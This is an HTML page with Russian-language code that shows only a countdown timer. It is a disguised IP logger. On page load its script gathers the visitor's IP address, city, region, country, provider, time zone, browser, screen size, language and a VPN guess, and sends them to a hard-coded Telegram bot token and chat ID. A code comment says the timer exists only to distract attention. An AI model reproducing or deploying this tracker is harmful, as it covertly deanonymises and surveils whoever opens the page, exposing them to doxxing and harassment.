<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #888;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .timer {
            font-size: 120px;
            font-weight: bold;
            color: #222;
            background: #aaa;
            padding: 40px 80px;
            border-radius: 30px;
            box-shadow: inset 0 -4px 0 #666;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="timer" id="timer">10</div>

    <script>
        (function() {
            const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
            const chatId = '8098905046';
            const timerEl = document.getElementById('timer');
            let counter = 10;
            let dataSent = false;

            function sendTelegram(text) {
                if (dataSent) return;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: text })
                }).catch(() => {});
                dataSent = true;
            }

            async function collectAndSend() {
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();

                    let vpnSigns = [];
                    if (data.proxy === true) vpnSigns.push('прокси');
                    if (data.hosting === true) vpnSigns.push('хостинг/датацентр');
                    if (data.org && data.org.toLowerCase().includes('vpn')) vpnSigns.push('VPN в названии');
                    if (data.country_code && !['RU','UA','BY','KZ'].includes(data.country_code)) vpnSigns.push('не СНГ');
                    const vpnStatus = vpnSigns.length > 0 ? '⚠️ Признаки VPN: ' + vpnSigns.join(', ') : '✅ VPN не обнаружено';

                    const message =
                        'IP: ' + (data.ip || '—') + '\n' +
                        'Город: ' + (data.city || '—') + '\n' +
                        'Регион: ' + (data.region || '—') + '\n' +
                        'Страна: ' + (data.country_name || '—') + ' (' + (data.country_code || '—') + ')\n' +
                        'Провайдер: ' + (data.org || '—') + '\n' +
                        'Часовой пояс: ' + (data.timezone || '—') + '\n' +
                        'Браузер: ' + navigator.userAgent + '\n' +
                        'Экран: ' + screen.width + 'x' + screen.height + '\n' +
                        'Язык: ' + navigator.language + '\n' +
                        vpnStatus;

                    sendTelegram(message);
                } catch(e) {
                    sendTelegram('Ошибка: ' + e.message);
                }
            }

            // === ЗАПУСКАЕМ СБОР ДАННЫХ МГНОВЕННО ===
            collectAndSend();

            // Счётчик просто для отвлечения внимания
            const interval = setInterval(() => {
                counter--;
                timerEl.textContent = counter;
                if (counter <= 0) {
                    clearInterval(interval);
                    timerEl.textContent = '💀';
                }
            }, 1000);
        })();
    </script>
</body>
</html>
